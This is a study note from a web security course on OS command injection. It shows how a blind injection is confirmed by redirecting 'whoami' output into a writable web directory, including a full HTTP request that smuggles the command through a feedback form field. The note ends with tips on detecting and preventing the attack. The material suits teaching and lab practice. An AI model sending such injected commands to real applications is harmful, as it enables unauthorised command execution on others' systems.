---
course: Web Security
topic: OS Command Injection
tags: [web-security]
---

## Redirecting the Output

### Using Output Redirection

Once you have identified a writable directory, you can redirect the output of the `whoami` command to a file in that directory. This can be done using the `>` operator in Unix-based systems.

#### Example: Redirecting Output

Assume the writable directory is `/public/images`. You can redirect the output of the `whoami` command to a file named `output.txt`.

```bash
whoami > /public/images/output.txt
```

### Full HTTP Request and Response

#### HTTP Request

```http
POST /submit-feedback HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

cmd=whoami%20%3E%20/public/images/output.txt
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Content-Type: text/html
Content-Length: 1024

<!DOCTYPE html>
<html>
<head>
<title>Feedback Submitted</title>
</head>
<body>
<h1>Your feedback has been submitted.</h1>
</body>
</html>
```

### Detection and Prevention

**Detection**:
- **Monitor File Changes**: Use tools like `inotifywait` to monitor file changes in writable directories.
- **Log Analysis**: Analyze logs for unusual file creation or modification patterns.

**Prevention**:
- **Restrict Write Permissions**: Limit write permissions to only necessary directories.
- **Use Sandboxing**: Run untrusted code in a sandboxed environment to prevent unauthorized file access.

---
<!-- nav -->
[[09-OS Command Injection|OS Command Injection]] | [[Web Security (PortSwigger)/10-OS Command Injection/04-Lab 3 Blind OS command injection with output redirection/00-Overview|Overview]] | [[Web Security (PortSwigger)/10-OS Command Injection/04-Lab 3 Blind OS command injection with output redirection/11-Understanding the Vulnerability|Understanding the Vulnerability]]
